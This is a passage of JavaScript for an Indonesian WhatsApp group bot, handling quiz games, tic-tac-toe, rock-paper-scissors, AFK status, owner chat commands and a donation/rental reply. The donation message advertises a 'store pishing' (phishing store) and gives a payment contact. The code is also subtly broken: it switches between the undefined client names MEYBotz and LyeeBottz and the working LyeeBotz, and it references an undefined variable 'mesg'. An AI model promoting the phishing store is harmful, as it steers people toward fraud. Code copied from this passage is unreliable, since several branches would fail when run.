        if (!isBotAdmins) return m.reply(`*Bot aja bukan admin anj*`)
        let gclink = (`https://chat.whatsapp.com/`+await LyeeBotz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`*maaf gak jadi, karena kamu ngirim link group ini*`)
        if (isAdmins) return m.reply(`*maaf kamu admin*`)
        if (isCreator) return m.reply(`*maaf kamu owner bot ku*`)
        MEYBotz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: LyeeBotz.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, LyeeBotz.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        LyeeBotz.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            LyeeBotz.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, LyeeBotz.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await LyeeBottz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, LyeeBotz.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, LyeeBotz.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, LyeeBotz.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, LyeeBotz.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, LyeeBotz.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, LyeeBotz.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await MEYBotz.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await MEYBotz.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    MEYBotz.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    MEYBotz.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) LyeeBotz.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) LyeeBotz.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) LyeeBottz.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    LyeeBotz.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) LyeeBotz.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) LyeeBotz.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    MEYBotz.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
	    
        switch(command) {
	    case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} *Telah Afk*${text ? ': ' + text : ''}`)
            }
            break
case 'pembuat': case 'outhor': {
                LyeeBotz.sendContact(m.chat, global.pembuatbotz, m)
            }
            break
        case 'ttc': case 'ttt': case 'tictactoe': {
        	if (!m.isGroup) throw mess.group
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await LyeeBotz.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await LyeeBotz.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            LyeeBotz.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *menantang* @${m.mentionedJid[0].split`@`[0]} *untuk bermain suit*

*Silahkan* @${m.mentionedJid[0].split`@`[0]} *untuk ketik terima/tolak*`
            this.suit[id] = {
            chat: await LyeeBotz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) LyeeBotz.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
                LyeeBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/fa4e782eaf3301e0019dd.jpg' }, caption: `*${ucapanWaktu} Kak ${m.pushName}*\n\n *Jika ingin berdonasi silahkan scan gambar diatas*\n\n*Jika ingin sewa bot atau premium*\n*Silahkan Chat Owner*\n\n*Atau klik link dibawah ini*\n_https://sociabuzz.com/meixganxstore\n\n*Atau Transfer via*\n- *Gopay Dana Ovo Qris ShopeePay*\n chat nomor berikut : wa.me/62895330146373\n\n*Jangan Lupa mampir di store pishing By LYEEHOST Yah*\nwww.lyeestore.myz.info\n\n_Terima Kasih_` }, { quoted: m })
            }
            break 
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    LyeeBotz.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    LyeeBotz.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    LyeeBotz.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    LyeeBotz.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    LyeeBotz.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    LyeeBotz.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    LyeeBotz.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await LyeeBotz.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await LyeeBotz.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    LyeeBotz.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, LyeeBotz.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    LyeeBotz.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, LyeeBotz.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    LyeeBotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, LyeeBotz.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    LyeeBotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, LyeeBotz.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    LyeeBotz.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, LyeeBotz.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    LyeeBotz.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    LyeeBotz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, LyeeBotz.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                LyeeBotz.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            
//Pembatas===============================================
            case 'slot': {
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            let sloth =`[  🎰VIRTUAL SLOT 🎰  ]\n------------------------\n\n🍒 : 🍌 : 🍇\n${somtoy}<=====\n🍇 : 🍌 : 🍒\n\n------------------------\n[  🎰 VIRTUAL SLOT 🎰  ]\n\n*Keterangan* :\n_Jika Mendapatkan 3Buah Sama_\n_Berarti Kamu Win_\n\n_Contoh : 🍒 : 🍒 : 🍒_ <=====`
            let buttons = [{ buttonId: 'slot', buttonText: { displayText: '🎰MAIN LAGI🎰' }, type: 1 }]
            await LyeeBotz.sendButtonText(m.chat, buttons, sloth, nyoutube, m)
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(m.chat, buttons, jawab, LyeeBotz.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
